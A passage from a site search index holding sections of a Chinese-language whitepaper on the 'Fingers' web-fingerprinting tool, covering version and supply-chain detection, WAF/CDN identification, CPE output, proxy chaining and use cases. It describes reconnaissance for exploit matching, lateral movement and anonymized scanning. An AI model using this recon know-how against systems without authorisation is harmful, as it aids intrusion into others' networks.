\u9ad8\u6027\u80fd\u3001\u7248\u672c\u63d0\u53d6\u3001\u4f9b\u5e94\u94fe\u8bc6\u522b Wappalyzer Web\u6280\u672f\u6808 4000+ \u56fd\u9645\u6807\u51c6\u3001\u6280\u672f\u5206\u7c7b\u5b8c\u6574 FingerprintHub \u7efc\u5408\u5e94\u7528 3500+ \u793e\u533a\u9a71\u52a8\u3001\u66f4\u65b0\u53ca\u65f6 EHole \u56fd\u4ea7\u5e94\u7528 900+ \u672c\u571f\u5316\u4f18\u52bf\u3001OA/ERP\u4e13\u9879 Goby \u5546\u4e1a\u7ea7 7000+ \u68c0\u6d4b\u7cbe\u5ea6\u9ad8\u3001\u8bef\u62a5\u7387\u4f4e Nmap \u670d\u52a1\u8bc6\u522b \u5168\u9762 TCP\u670d\u52a1\u6743\u5a01\u3001\u534f\u8bae\u6df1\u5ea6\u8bc6\u522b"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u521b\u65b0\u7a81\u7834","title":"\u6280\u672f\u521b\u65b0\u7a81\u7834","text":"<p>\u4f20\u7edf\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u901a\u5e38\u4f9d\u8d56\u5355\u4e00\u6307\u7eb9\u5e93\uff0c\u8986\u76d6\u8303\u56f4\u6709\u9650\u4e14\u5b58\u5728\u660e\u663e\u77ed\u677f\u3002Fingers\u901a\u8fc7\u4ee5\u4e0b\u521b\u65b0\u5b9e\u73b0\u4e86\u8d28\u7684\u98de\u8dc3\uff1a</p> <p>\u5f15\u64ce\u7ea7\u878d\u5408\uff1a\u4e0d\u540c\u4e8e\u7b80\u5355\u7684\u89c4\u5219\u5408\u5e76\uff0cFingers\u5728\u5f15\u64ce\u5c42\u9762\u5b9e\u73b0\u4e86\u6df1\u5ea6\u878d\u5408\uff0c\u6bcf\u4e2a\u6307\u7eb9\u5e93\u90fd\u4fdd\u6301\u5176\u539f\u751f\u7684\u8bc6\u522b\u903b\u8f91\u548c\u4f18\u52bf\u3002</p> <p>\u65e0\u635f\u80fd\u529b\u4f20\u627f\uff1a\u901a\u8fc7\u91cd\u65b0\u5b9e\u73b0\u800c\u975e\u8f6c\u6362\u89c4\u5219\uff0c\u786e\u4fdd\u6bcf\u4e2a\u6307\u7eb9\u5e93\u7684\u8bc6\u522b\u80fd\u529b\u5f97\u5230100%\u4fdd\u7559\uff0c\u751a\u81f3\u5728\u6027\u80fd\u4e0a\u6709\u6240\u4f18\u5316\u3002</p> <p>\u52a8\u6001\u6743\u91cd\u8c03\u6574\uff1a\u6839\u636e\u4e0d\u540c\u573a\u666f\u548c\u76ee\u6807\u7279\u5f81\uff0c\u52a8\u6001\u8c03\u6574\u5404\u5f15\u64ce\u7684\u6743\u91cd\uff0c\u5b9e\u73b0\u6700\u4f18\u7684\u8bc6\u522b\u6548\u679c\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7b2c\u4e09\u65b9\u6307\u7eb9\u5e93\u6269\u5c55\u673a\u5236","title":"\u7b2c\u4e09\u65b9\u6307\u7eb9\u5e93\u6269\u5c55\u673a\u5236","text":"<p>Fingers\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684\u7b2c\u4e09\u65b9\u6307\u7eb9\u5e93\u6269\u5c55\u652f\u6301\uff0c\u8ba9\u751f\u6001\u5f00\u53d1\u53d8\u5f97\u7b80\u5355\u9ad8\u6548\uff1a</p> <p>\u63d2\u4ef6\u5316\u67b6\u6784\uff1a - \u652f\u6301\u52a8\u6001\u52a0\u8f7d\u7b2c\u4e09\u65b9\u6307\u7eb9\u5f15\u64ce - \u63d0\u4f9b\u6807\u51c6\u5316\u7684\u6307\u7eb9\u5f15\u64ce\u63a5\u53e3\u89c4\u8303 - \u652f\u6301\u70ed\u63d2\u62d4\u5f0f\u7684\u6307\u7eb9\u5e93\u7ba1\u7406</p> <p>\u5f00\u53d1\u8005\u53cb\u597d\u7684\u6269\u5c55\u63a5\u53e3\uff1a - \u7b80\u5316\u7684\u6307\u7eb9\u89c4\u5219\u5f00\u53d1\u6846\u67b6 - \u5b8c\u6574\u7684\u6d4b\u8bd5\u548c\u9a8c\u8bc1\u5de5\u5177\u94fe - \u4e30\u5bcc\u7684\u5f00\u53d1\u6587\u6863\u548c\u793a\u4f8b\u4ee3\u7801</p> <p>\u4f01\u4e1a\u5b9a\u5236\u652f\u6301\uff1a - \u652f\u6301\u79c1\u6709\u6307\u7eb9\u5e93\u7684\u96c6\u6210 - \u63d0\u4f9b\u6307\u7eb9\u89c4\u5219\u7684\u52a0\u5bc6\u548c\u4fdd\u62a4\u673a\u5236 - \u652f\u6301\u4f01\u4e1a\u5185\u90e8\u6307\u7eb9\u77e5\u8bc6\u5e93\u7684\u6784\u5efa</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u793e\u533a\u751f\u6001\u5efa\u8bbe","title":"\u793e\u533a\u751f\u6001\u5efa\u8bbe","text":"<p>\u81ea\u52a8\u66f4\u65b0\u673a\u5236\uff1a - \u6bcf\u5468\u540c\u6b65\uff1a\u7b2c\u4e09\u65b9\u89c4\u5219\u5e93\u901a\u8fc7GitHub Action\u81ea\u52a8\u66f4\u65b0 - \u589e\u91cf\u66f4\u65b0\uff1a\u667a\u80fd\u8bc6\u522b\u89c4\u5219\u53d8\u5316\uff0c\u4ec5\u66f4\u65b0\u5fc5\u8981\u5185\u5bb9 - \u7248\u672c\u7ba1\u7406\uff1a\u5b8c\u6574\u7684\u89c4\u5219\u7248\u672c\u63a7\u5236\u548c\u56de\u6eda\u673a\u5236 - \u8d28\u91cf\u4fdd\u8bc1\uff1a\u81ea\u52a8\u5316\u6d4b\u8bd5\u786e\u4fdd\u66f4\u65b0\u540e\u7684\u89c4\u5219\u8d28\u91cf</p> <p>\u5f00\u6e90\u534f\u4f5c\u6a21\u5f0f\uff1a - \u652f\u6301\u793e\u533a\u7528\u6237\u8d21\u732e\u6307\u7eb9\u89c4\u5219 - \u5efa\u7acb\u6307\u7eb9\u8d28\u91cf\u8bc4\u4f30\u548c\u5ba1\u6838\u673a\u5236 - \u63d0\u4f9b\u6307\u7eb9\u8bc6\u522b\u77e5\u8bc6\u5e93\u548c\u6700\u4f73\u5b9e\u8df5\u5206\u4eab</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u7cbe\u5ea6\u8bc6\u522b\u80fd\u529b","title":"\u9ad8\u7cbe\u5ea6\u8bc6\u522b\u80fd\u529b","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u591a\u7ef4\u5ea6\u4fe1\u606f\u63d0\u53d6","title":"\u591a\u7ef4\u5ea6\u4fe1\u606f\u63d0\u53d6","text":"<p>Fingers\u4e0d\u4ec5\u4ec5\u8bc6\u522b\u5e94\u7528\u7c7b\u578b\uff0c\u66f4\u6df1\u5165\u6316\u6398\u6280\u672f\u7ec6\u8282\uff1a</p> <p>Fingers\u5728\u7248\u672c\u4fe1\u606f\u63d0\u53d6\u65b9\u9762\u91c7\u7528\u4e86\u591a\u7ef4\u5ea6\u878d\u5408\u7684\u6280\u672f\u8def\u7ebf\u3002\u7cfb\u7edf\u4e0d\u4ec5\u80fd\u591f\u4ece\u663e\u800c\u6613\u89c1\u7684\u54cd\u5e94\u5934\u4fe1\u606f\u4e2d\u83b7\u53d6\u7248\u672c\u53f7\uff0c\u66f4\u80fd\u591f\u901a\u8fc7\u6df1\u5ea6\u5206\u6790\u9519\u8bef\u9875\u9762\u7684\u683c\u5f0f\u53d8\u5316\u3001HTML\u6ce8\u91ca\u4e2d\u7684\u6784\u5efa\u4fe1\u606f\u3001JavaScript\u6587\u4ef6\u7684\u7248\u672c\u6807\u8bc6\u7b49\u9690\u853d\u6e20\u9053\u83b7\u53d6\u51c6\u786e\u7684\u7248\u672c\u4fe1\u606f\u3002\u7248\u672c\u89c4\u8303\u5316\u6a21\u5757\u8fd0\u7528\u8bed\u4e49\u5316\u7248\u672c\u89e3\u6790\u7b97\u6cd5\uff0c\u80fd\u591f\u5904\u7406\u5404\u79cd\u975e\u6807\u51c6\u7684\u7248\u672c\u53f7\u683c\u5f0f\uff0c\u5e76\u5efa\u7acb\u7edf\u4e00\u7684\u7248\u672c\u6bd4\u8f83\u57fa\u51c6\u3002\u7cfb\u7edf\u7279\u522b\u5173\u6ce8\u5386\u53f2\u7248\u672c\u548c\u8865\u4e01\u7ea7\u522b\u7684\u8bc6\u522b\uff0c\u901a\u8fc7\u5efa\u7acb\u5e9e\u5927\u7684\u7248\u672c\u7279\u5f81\u6570\u636e\u5e93\uff0c\u80fd\u591f\u7cbe\u786e\u8bc6\u522b\u5230\u5177\u4f53\u7684\u8865\u4e01\u7248\u672c\uff0c\u4e3a\u540e\u7eed\u7684\u6f0f\u6d1e\u5339\u914d\u548c\u98ce\u9669\u8bc4\u4f30\u63d0\u4f9b\u7cbe\u51c6\u7684\u6570\u636e\u652f\u6491\u3002</p> <p>\u4f9b\u5e94\u94fe\u8bc6\u522b\u6280\u672f\u4f53\u73b0\u4e86Fingers\u5bf9\u73b0\u4ee3\u8f6f\u4ef6\u5f00\u53d1\u751f\u6001\u7684\u6df1\u523b\u7406\u89e3\u3002\u7cfb\u7edf\u901a\u8fc7\u5206\u6790\u8f6f\u4ef6\u7684\u4ee3\u7801\u7ed3\u6784\u3001\u4f9d\u8d56\u5173\u7cfb\u3001\u6784\u5efa\u6a21\u5f0f\u7b49\u591a\u4e2a\u7ef4\u5ea6\uff0c\u80fd\u591f\u8bc6\u522b\u51fa\u5b8c\u6574\u7684\u6280\u672f\u6808\u7ec4\u5408\u548c\u4f9b\u5e94\u94fe\u5173\u7cfb\u3002\u5382\u5546\u4fe1\u606f\u8bc6\u522b\u4e0d\u4ec5\u9650\u4e8e\u660e\u663e\u7684\u6807\u8bc6\u7b26\uff0c\u8fd8\u80fd\u591f\u901a\u8fc7\u4ee3\u7801\u98ce\u683c\u5206\u6790\u3001\u67b6\u6784\u6a21\u5f0f\u8bc6\u522b\u7b49\u6280\u672f\u624b\u6bb5\u63a8\u65ad\u51fa\u8f6f\u4ef6\u7684\u771f\u5b9e\u6765\u6e90\u3002\u6280\u672f\u6808\u5206\u6790\u6a21\u5757\u80fd\u591f\u8bc6\u522b\u524d\u7aef\u6846\u67b6\u3001\u540e\u7aef\u8bed\u8a00\u3001\u6570\u636e\u5e93\u7c7b\u578b\u3001\u4e2d\u95f4\u4ef6\u7248\u672c\u7b49\u5b8c\u6574\u7684\u6280\u672f\u6808\u4fe1\u606f\uff0c\u4e3a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u63d0\u4f9b\u5168\u9762\u7684\u653b\u51fb\u9762\u60c5\u62a5\u3002\u5f00\u53d1\u6a21\u5f0f\u8bc6\u522b\u529f\u80fd\u5219\u80fd\u591f\u5206\u6790\u5f00\u53d1\u8005\u7684\u7f16\u7801\u4e60\u60ef\u3001\u67b6\u6784\u504f\u597d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5f80\u5f80\u80fd\u591f\u63ed\u793a\u7cfb\u7edf\u7684\u6f5c\u5728\u5f31\u70b9\u548c\u653b\u51fb\u5165\u53e3\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7279\u6b8a\u573a\u666f\u9ad8\u7ea7\u8bc6\u522b\u6280\u672f","title":"\u7279\u6b8a\u573a\u666f\u9ad8\u7ea7\u8bc6\u522b\u6280\u672f","text":"<p>Fingers\u5728\u7279\u6b8a\u573a\u666f\u8bc6\u522b\u65b9\u9762\u5c55\u73b0\u51fa\u4e86\u5f3a\u5927\u7684\u6280\u672f\u521b\u65b0\u80fd\u529b\uff0c\u7279\u522b\u662f\u5728\u9690\u85cf\u6307\u7eb9\u6316\u6398\u9886\u57df\u3002\u7cfb\u7edf\u91c7\u7528\u4e86\u57fa\u4e8e\u5f02\u5e38\u54cd\u5e94\u5206\u6790\u7684\u6280\u672f\u8def\u7ebf\uff0c\u901a\u8fc7\u6df1\u5ea6\u5206\u6790404\u9519\u8bef\u9875\u9762\u7684\u7ec6\u5fae\u5dee\u5f02\u6765\u8bc6\u522b\u88ab\u523b\u610f\u9690\u85cf\u7684\u5e94\u7528\u4fe1\u606f\u3002\u8fd9\u79cd\u6280\u672f\u57fa\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf\uff1a\u5373\u4f7f\u7ba1\u7406\u5458\u4fee\u6539\u4e86\u6b63\u5e38\u9875\u9762\u7684\u5185\u5bb9\uff0c\u9519\u8bef\u9875\u9762\u5f80\u5f80\u4fdd\u6301\u539f\u59cb\u7684\u6846\u67b6\u7279\u5f81\u3002favicon\u5206\u6790\u6280\u672f\u5219\u5229\u7528\u4e86\u7f51\u7ad9\u56fe\u6807\u6587\u4ef6\u901a\u5e38\u4e0d\u88ab\u5173\u6ce8\u4f46\u5177\u6709\u5f3a\u70c8\u552f\u4e00\u6027\u7684\u7279\u70b9\uff0c\u901a\u8fc7\u6784\u5efa\u5e9e\u5927\u7684favicon\u54c8\u5e0c\u6570\u636e\u5e93\uff0c\u5373\u4f7f\u5728\u9875\u9762\u5185\u5bb9\u5b8c\u5168\u88ab\u4f2a\u88c5\u7684\u60c5\u51b5\u4e0b\u4e5f\u80fd\u51c6\u786e\u8bc6\u522b\u5e94\u7528\u7c7b\u578b\u3002</p> <p>\u6ce8\u91ca\u4fe1\u606f\u63d0\u53d6\u529f\u80fd\u4f53\u73b0\u4e86\u5bf9\u73b0\u4ee3Web\u5f00\u53d1\u6d41\u7a0b\u7684\u6df1\u523b\u7406\u89e3\u3002\u5f00\u53d1\u8005\u5728\u4ee3\u7801\u4e2d\u7559\u4e0b\u7684\u6ce8\u91ca\u3001\u6784\u5efa\u4fe1\u606f\u3001\u7248\u672c\u6807\u8bc6\u7b49\u5f80\u5f80\u5305\u542b\u4e30\u5bcc\u7684\u6280\u672f\u60c5\u62a5\uff0c\u7cfb\u7edf\u901a\u8fc7\u667a\u80fd\u89e3\u6790HTML\u6ce8\u91ca\u3001JavaScript\u4ee3\u7801\u6ce8\u91ca\u3001CSS\u6587\u4ef6\u5934\u7b49\u4fe1\u606f\u6e90\uff0c\u80fd\u591f\u83b7\u53d6\u6846\u67b6\u7248\u672c\u3001\u6784\u5efa\u65f6\u95f4\u3001\u5f00\u53d1\u73af\u5883\u7b49\u5173\u952e\u4fe1\u606f\u3002\u9759\u6001\u8d44\u6e90\u5206\u6790\u6280\u672f\u5219\u901a\u8fc7\u5206\u6790CSS\u3001JavaScript\u6587\u4ef6\u7684\u8def\u5f84\u7ed3\u6784\u3001\u547d\u540d\u89c4\u5f8b\u3001\u6587\u4ef6\u7ec4\u7ec7\u65b9\u5f0f\u6765\u63a8\u65ad\u4f7f\u7528\u7684\u524d\u7aef\u6846\u67b6\u548c\u5f00\u53d1\u6a21\u5f0f\u3002</p> <p>\u57fa\u7840\u8bbe\u65bd\u8bc6\u522b\u6280\u672f\u53cd\u6620\u4e86\u5bf9\u73b0\u4ee3\u4e92\u8054\u7f51\u67b6\u6784\u7684\u5168\u9762\u638c\u63e1\u3002WAF\u548cCDN\u68c0\u6d4b\u4e0d\u4ec5\u4ec5\u8bc6\u522b\u5176\u5b58\u5728\u6027\uff0c\u66f4\u80fd\u591f\u5206\u6790\u5176\u914d\u7f6e\u7279\u5f81\u3001\u7248\u672c\u4fe1\u606f\u3001\u7ed5\u8fc7\u53ef\u80fd\u6027\u7b49\u5173\u952e\u4fe1\u606f\u3002\u53cd\u5411\u4ee3\u7406\u8bc6\u522b\u6280\u672f\u901a\u8fc7\u5206\u6790HTTP\u5934\u7684\u5fae\u5999\u5dee\u5f02\u3001\u54cd\u5e94\u65f6\u95f4\u6a21\u5f0f\u3001\u9519\u8bef\u9875\u9762\u7279\u5f81\u7b49\u6765\u5224\u65ad\u8d1f\u8f7d\u5747\u8861\u5668\u548c\u53cd\u5411\u4ee3\u7406\u7684\u7c7b\u578b\u548c\u914d\u7f6e\u3002\u5bb9\u5668\u5316\u73af\u5883\u8bc6\u522b\u529f\u80fd\u7279\u522b\u5173\u6ce8\u73b0\u4ee3\u4e91\u539f\u751f\u5e94\u7528\u7684\u7279\u5f81\uff0c\u80fd\u591f\u8bc6\u522bDocker\u5bb9\u5668\u3001Kubernetes\u96c6\u7fa4\u3001\u5fae\u670d\u52a1\u67b6\u6784\u7b49\u73b0\u4ee3\u90e8\u7f72\u6a21\u5f0f\u3002\u4e91\u670d\u52a1\u5546\u8bc6\u522b\u5219\u901a\u8fc7\u5206\u6790\u7f51\u7edc\u7279\u5f81\u3001\u670d\u52a1\u54cd\u5e94\u6a21\u5f0f\u3001\u57fa\u7840\u8bbe\u65bd\u6807\u8bc6\u7b49\u6765\u5224\u65ad\u5e94\u7528\u7684\u4e91\u73af\u5883\u7c7b\u578b\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6807\u51c6\u5316\u8f93\u51fa","title":"\u6807\u51c6\u5316\u8f93\u51fa","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#cpe\u89c4\u8303\u5316","title":"CPE\u89c4\u8303\u5316","text":"<p>\u57fa\u4e8eNIST CPE 2.3\u6807\u51c6\uff0c\u63d0\u4f9b\u7edf\u4e00\u7684\u4ea7\u54c1\u6807\u8bc6\u683c\u5f0f\uff1a</p> <pre><code>cpe:2.3:a:vendor:product:version:update:edition:language:sw_edition:target_sw:target_hw:other\n</code></pre>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7ed3\u679c\u7edf\u4e00\u683c\u5f0f","title":"\u7ed3\u679c\u7edf\u4e00\u683c\u5f0f","text":"<pre><code>{\n  \"name\": \"Apache HTTP Server\",\n  \"version\": \"2.4.41\",\n  \"vendor\": \"apache\",\n  \"product\": \"http_server\",\n  \"cpe\": \"cpe:2.3:a:apache:http_server:2.4.41:*:*:*:*:*:*:*\",\n  \"confidence\": 95,\n  \"source\": [\"fingers\", \"wappalyzer\"],\n  \"tags\": [\"web-server\", \"http\"],\n  \"details\": {\n    \"port\": 80,\n    \"protocol\": \"http\",\n    \"method\": \"passive\"\n  }\n}\n</code></pre>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u522b\u540d\u89e3\u6790","title":"\u522b\u540d\u89e3\u6790","text":"<ul> <li>\u81ea\u52a8\u6620\u5c04\uff1a\u57fa\u4e8e\u9884\u5b9a\u4e49\u89c4\u5219\u81ea\u52a8\u89e3\u6790\u4ea7\u54c1\u522b\u540d</li> <li>\u667a\u80fd\u5339\u914d\uff1a\u4f7f\u7528\u6a21\u7cca\u5339\u914d\u7b97\u6cd5\u5904\u7406\u547d\u540d\u5dee\u5f02</li> <li>\u4eba\u5de5\u7ef4\u62a4\uff1a\u901a\u8fc7aliases.yaml\u6587\u4ef6\u624b\u52a8\u7ef4\u62a4\u7279\u6b8a\u6620\u5c04\u5173\u7cfb</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6027\u80fd\u4f18\u5316","title":"\u6027\u80fd\u4f18\u5316","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u5e76\u53d1\u652f\u6301","title":"\u9ad8\u5e76\u53d1\u652f\u6301","text":"<ul> <li>\u534f\u7a0b\u6c60\uff1a\u57fa\u4e8eGolang\u534f\u7a0b\u5b9e\u73b0\u9ad8\u5e76\u53d1\u5904\u7406</li> <li>\u8fde\u63a5\u590d\u7528\uff1aHTTP Keep-Alive\u548c\u8fde\u63a5\u6c60\u4f18\u5316</li> <li>\u8d44\u6e90\u9650\u5236\uff1a\u667a\u80fd\u7684\u901f\u7387\u9650\u5236\u548c\u8d44\u6e90\u7ba1\u63a7</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7f13\u5b58\u673a\u5236","title":"\u7f13\u5b58\u673a\u5236","text":"<ul> <li>\u591a\u7ea7\u7f13\u5b58\uff1a\u5185\u5b58\u7f13\u5b58 + \u6301\u4e45\u5316\u7f13\u5b58\u7684\u7ec4\u5408\u65b9\u6848</li> <li>TTL\u7ba1\u7406\uff1a\u5408\u7406\u7684\u7f13\u5b58\u8fc7\u671f\u7b56\u7565</li> <li>\u7f13\u5b58\u9884\u70ed\uff1a\u542f\u52a8\u65f6\u9884\u52a0\u8f7d\u5e38\u7528\u6307\u7eb9\u89c4\u5219</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u5e76\u53d1\u4e0e\u5206\u5e03\u5f0f\u652f\u6301","title":"\u9ad8\u5e76\u53d1\u4e0e\u5206\u5e03\u5f0f\u652f\u6301","text":"<p>Fingers\u5728\u9ad8\u5e76\u53d1\u626b\u63cf\u80fd\u529b\u65b9\u9762\u91c7\u7528\u4e86\u5148\u8fdb\u7684\u6280\u672f\u67b6\u6784\uff0c\u4e0d\u4ec5\u652f\u6301\u5355\u673a\u9ad8\u5e76\u53d1\uff0c\u66f4\u5177\u5907\u5206\u5e03\u5f0f\u96c6\u7fa4\u6269\u5c55\u80fd\u529b\u3002\u5355\u673a\u9ad8\u5e76\u53d1\u901a\u8fc7Go\u8bed\u8a00\u7684\u534f\u7a0b\u6c60\u3001\u8fde\u63a5\u590d\u7528\u3001\u667a\u80fd\u901f\u7387\u9650\u5236\u7b49\u6280\u672f\u5b9e\u73b0\uff0c\u80fd\u591f\u5728\u4fdd\u8bc1\u76ee\u6807\u7cfb\u7edf\u7a33\u5b9a\u6027\u7684\u524d\u63d0\u4e0b\u6700\u5927\u5316\u626b\u63cf\u6548\u7387\u3002\u5206\u5e03\u5f0f\u67b6\u6784\u652f\u6301\u591a\u8282\u70b9\u534f\u540c\u4f5c\u4e1a\uff0c\u5177\u5907\u81ea\u52a8\u8282\u70b9\u53d1\u73b0\u3001\u667a\u80fd\u4efb\u52a1\u5206\u7247\u3001\u7edf\u4e00\u7ed3\u679c\u805a\u5408\u7b49\u80fd\u529b\u3002</p> <p>\u4ee3\u7406\u6a21\u5f0f\u652f\u6301\uff1a\u7cfb\u7edf\u5168\u9762\u652f\u6301\u4ee3\u7406\u6a21\u5f0f\uff0c\u5305\u62ec\u5e26\u6709\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u7684HTTP(S)\u548cSOCKS\u4ee3\u7406\u3002\u4ee3\u7406\u652f\u6301\u4e0d\u4ec5\u9650\u4e8e\u7b80\u5355\u7684\u6d41\u91cf\u8f6c\u53d1\uff0c\u8fd8\u5305\u62ec\u4ee3\u7406\u94fe\u8def\u7684\u667a\u80fd\u7ba1\u7406\u3001\u6545\u969c\u5207\u6362\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u9ad8\u7ea7\u529f\u80fd\u3002\u7279\u522b\u9488\u5bf9\u6e17\u900f\u6d4b\u8bd5\u573a\u666f\uff0c\u652f\u6301\u591a\u5c42\u4ee3\u7406\u3001\u4ee3\u7406\u6c60\u8f6e\u6362\u3001\u533f\u540d\u5316\u914d\u7f6e\u7b49\u7279\u6027\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5e94\u7528\u573a\u666f","title":"\u5e94\u7528\u573a\u666f","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u653b\u51fb\u9762\u7ba1\u7406asm","title":"\u653b\u51fb\u9762\u7ba1\u7406(ASM)","text":"<ul> <li>\u8d44\u4ea7\u53d1\u73b0\uff1a\u5168\u9762\u8bc6\u522b\u4f01\u4e1a\u5916\u7f51\u66b4\u9732\u7684\u5e94\u7528\u548c\u670d\u52a1</li> <li>\u6280\u672f\u6808\u5206\u6790\uff1a\u4e86\u89e3\u4f01\u4e1a\u4f7f\u7528\u7684\u6280\u672f\u6808\u548c\u7248\u672c\u5206\u5e03</li> <li>\u98ce\u9669\u8bc4\u4f30\uff1a\u57fa\u4e8e\u7248\u672c\u4fe1\u606f\u8fdb\u884c\u5b89\u5168\u98ce\u9669\u8bc4\u4f30</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6e17\u900f\u6d4b\u8bd5","title":"\u6e17\u900f\u6d4b\u8bd5","text":"<ul> <li>\u76ee\u6807\u4fa6\u5bdf\uff1a\u5feb\u901f\u8bc6\u522b\u76ee\u6807\u7cfb\u7edf\u7684\u6280\u672f\u7279\u5f81</li> <li>\u6f0f\u6d1e\u5173\u8054\uff1a\u57fa\u4e8e\u6307\u7eb9\u4fe1\u606f\u5339\u914d\u76f8\u5e94\u7684exploit</li> <li>\u6a2a\u5411\u79fb\u52a8\uff1a\u8bc6\u522b\u5185\u7f51\u8d44\u4ea7\uff0c\u4e3a\u6a2a\u5411\u79fb\u52a8\u63d0\u4f9b\u6307\u5bfc</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b89\u5168\u8fd0\u8425","title":"\u5b89\u5168\u8fd0\u8425","text":"<ul> <li>\u8d44\u4ea7\u6e05\u5355\uff1a\u7ef4\u62a4\u51c6\u786e\u7684IT\u8d44\u4ea7\u6e05\u5355\u548c\u914d\u7f6e\u4fe1\u606f</li> <li>\u53d8\u66f4\u76d1\u63a7\uff1a\u76d1\u63a7\u8d44\u4ea7\u914d\u7f6e\u53d8\u5316\u548c\u65b0\u589e\u8d44\u4ea7</li> <li>\u5408\u89c4\u68c0\u67e5\uff1a\u57fa\u4e8e\u6807\u51c6\u5316\u6570\u636e\u8fdb\u884c\u5408\u89c4\u6027\u68c0\u67e5</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5a01\u80c1\u60c5\u62a5","title":"\u5a01\u80c1\u60c5\u62a5","text":"<ul> <li>IOC\u5173\u8054\uff1a\u5c06\u6307\u7eb9\u4fe1\u606f\u4e0e\u5a01\u80c1\u60c5\u62a5\u8fdb\u884c\u5173\u8054\u5206\u6790</li> <li>\u653b\u51fb\u5f52\u56e0\uff1a\u57fa\u4e8e\u6280\u672f\u7279\u5f81\u8fdb\u884c\u653b\u51fb\u8005\u5f52\u56e0\u5206\u6790</li> <li>\u8d8b\u52bf\u5206\u6790\uff1a\u5206\u6790\u6280\u672f\u4f7f\u7528\u8d8b\u52bf\u548c\u5b89\u5168\u98ce\u9669\u53d8\u5316</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7ade\u4e89\u4f18\u52bf","title":"\u7ade\u4e89\u4f18\u52bf","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u7ade\u4e89\u529b\u4e09\u5927\u5173\u952e\u4f18\u52bf\u7684\u534f\u540c\u6548\u5e94","title":"\u6838\u5fc3\u7ade\u4e89\u529b\uff1a\u4e09\u5927\u5173\u952e\u4f18\u52bf\u7684\u534f\u540c\u6548\u5e94","text":"<p>Fingers\u7684\u7ade\u4e89\u4f18\u52bf\u6e90\u4e8e\u4e09\u5927\u5173\u952e\u70b9\u7684\u6709\u673a\u7ed3\u5408\uff0c\u5f62\u6210\u4e86\u72ec\u7279\u7684\u6280\u672f\u62a4\u57ce\u6cb3\uff1a</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5d4c\u5165\u5f0f\u67b6\u6784\u4f18\u52bf","title":"\u5d4c\u5165\u5f0f\u67b6\u6784\u4f18\u52bf","text":"<ol> <li> <p>API\u6548\u7387\u7684\u7edd\u5bf9\u4f18\u52bf    \u6beb\u79d2\u7ea7\u54cd\u5e94\u65f6\u95f4\uff0c\u76f8\u6bd4\u72ec\u7acb\u5de5\u5177\u8c03\u7528\u63d0\u534710-100\u500d\u6027\u80fd\uff0c\u8fd9\u662f\u5176\u4ed6\u65b9\u6848\u96be\u4ee5\u5339\u654c\u7684\u6280\u672f\u4f18\u52bf\u3002</p> </li> <li> 